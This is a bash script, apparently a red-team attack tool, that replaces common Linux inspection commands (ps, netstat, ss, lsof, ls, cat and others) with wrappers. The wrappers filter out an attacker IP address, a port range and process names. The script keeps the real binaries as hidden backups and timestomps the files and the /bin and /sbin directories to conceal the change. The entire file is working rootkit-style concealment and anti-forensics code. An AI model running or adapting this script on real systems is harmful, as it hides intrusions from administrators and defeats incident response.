#!/usr/bin/env bash
#
# Replace common defensive utilities with bash scripts that grep out the
# strings we want to remain hidden. This includes our IP address, our port
# numbers, and our secret processes.


#
# *** Configurable variables ***
#

IP="10.10.2.4"
COMMANDS="ps top ss netstat lsof who w last cat ls" # don't replace grep or egrep, causes infinite recursion and errors with my other scripts

IP_ESCAPED=$(echo "$IP" | sed "s/\./\\\./g") # escape the '.'s in the IP for use with egrep
PROCESSES="egrep|sleep|run-parts|cron\.hourly|/usr/sbin/CROND -n|gnano|nohup|setsid|wget|flock"
PORTS="59000|59001|59002|59003|59004|59005|59006|59007|59008|59009|60...|61..."
HIDE_ME="$IP_ESCAPED|$PROCESSES|$PORTS"

# Colors
COLOR_OFF='\033[0m'
BOLD_WHITE='\033[1;37m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
GREEN='\033[0;32m'


#
# *** Helper Functions ***
#

#######################################
# Log colored and status-prefixed text to the terminal depending on the
# user-provided log type.
#
# Globals:
#   All above colors
# Arguments:
#   Log type, one of "task", "error", "warning", "info", "log", or "debug"
#   Log message, the message to be printed to the terminal
# Outputs:
#   Colored and status-prefixed text otherwise, or usage on error
# Returns:
#   0 if cecho usage was correct, 1 otherwise
########################################
cecho() {
	local cecho_usage="${RED}[!] cecho usage: cecho <task|error|warning|info|log|debug|done> <\"log_message\">${COLOR_OFF}"

	if [ $# -ne 2 ]; then
		echo -e "$cecho_usage"
		return 1
	fi

	local log_type=$1
	local log_message=$2

	case $log_type in
		"task")
			echo
			echo -e "${BOLD_WHITE}[+] --- ${log_message}${COLOR_OFF}"
			;;
		"error")
			echo -e "${RED}[!] ${log_message}${COLOR_OFF}" >&2 # print to STDERR
			;;
		"warning")
			echo -e "${YELLOW}[-] ${log_message}${COLOR_OFF}"
			;;
		"info")
			echo -e "${CYAN}[*] ${log_message}${COLOR_OFF}"
			;;
		"log")
			echo -e "${BLUE}[^] ${log_message}${COLOR_OFF}"
			;;
		"debug")
			echo -e "${PURPLE}[?] ${log_message}${COLOR_OFF}"
			;;
		"done")
			echo -e "${GREEN}[=] ${log_message}${COLOR_OFF}"
			;;
		*)
			echo -e "$cecho_usage"
			return 1
			;;
	esac
}

#######################################
# Get a file's timestamp in YYYYMMDDhhmm format for use with "time -t".
#
# Globals:
#   None
# Arguments:
#   The file path to retrieve the timestamp from
# Outputs:
#   Status or usage on error, otherwise nothing
# Returns:
#   0 if stat obtained file's timestamp, 1 otherwise
########################################
get_timestamp() {
	if [ $# -ne 1 ]; then
		cecho error "get_timestamp usage: get_timestamp <file>"
		return 1
	fi
	
	local file="$1"

	if ! stat -L "$file" \
		| grep "Modify" \
		| cut -d " " -f 2,3 \
		| cut -d ":" -f 1,2 \
		| tr -d "-" \
		| tr -d ":" \
		| tr -d " "; then
		cecho error "Couldn't stat '$file'"
		return 1
	fi
}

#######################################
# Set a file's timestamp (perform a "timestomp").
#
# Globals:
#   None
# Arguments:
#   The file path to set the timestamp on
# Outputs:
#   Status or usage on error, otherwise nothing
# Returns:
#   0 if file's timestamp was set, 1 otherwise
########################################
set_timestamp() {
	if [ $# -ne 2 ]; then
		cecho error "set_timestamp usage: set_timestamp <timestamp> <file>"
		return 1
	fi

	local timestamp="$1"
	local file="$2"

	if ! touch -t "$timestamp" "$file"; then
		cecho error "Couldn't modify timestamp for '$file'"
		return 1
	else
		cecho info "Modified timestamp for '$file'"
	fi
}


#
# *** Root check ***
#

if [ $EUID -ne 0 ]; then
	cecho error "Must run as root"
	exit 1
fi


#
# --- Main ---
#

cecho task "Replacing binaries with scripts that hide our evil doings"

if [ -z "$COMMANDS" ]; then
	cecho warning "No binaries specified, nothing to replace"
else
	bin_timestamp=$(get_timestamp /bin)
	sbin_timestamp=$(get_timestamp /sbin)

	for command in $COMMANDS; do
		if [ -z "$command" ]; then
			cecho error "Provided binary is an empty string, strange! Skipping..."
		else
			if ! which "$command" &>/dev/null; then
				cecho warning "Binary '$command' doesn't exist, skipping"
			else
				command_path=$(which $command)

				if [ -f "/bin/bak${command}" ]; then
					cecho log "Binary '$command' has already been hijacked, skipping"
				else
					command_timestamp=$(get_timestamp "$command_path")

					if ! cp "$command_path" "/bin/bak${command}"; then
						cecho error "Could not copy '$command_path' to '/bin/bak${command}', aborting"
					else
						if ! echo "/bin/bak${command} \$@ | egrep -v \"$HIDE_ME\"" > "$command_path"; then
							cecho error "Could not write to '$command_path', restoring original binary..."
							mv "/bin/bak${command}" "$command_path" || cecho error "Could not restore original binary '$command_path'"
						else
							cecho info "Replaced binary at '$command_path'"
							chmod 755 "$command_path" || cecho error "Could not chmod '$command_path'"
						fi
					fi

					set_timestamp $command_timestamp "$command_path"
					set_timestamp $command_timestamp "/bin/bak${command}"
				fi
			fi
		fi
	done

	set_timestamp $bin_timestamp "/bin"
	set_timestamp $sbin_timestamp "/sbin"
fi

cecho done "Done replacing binaries!"
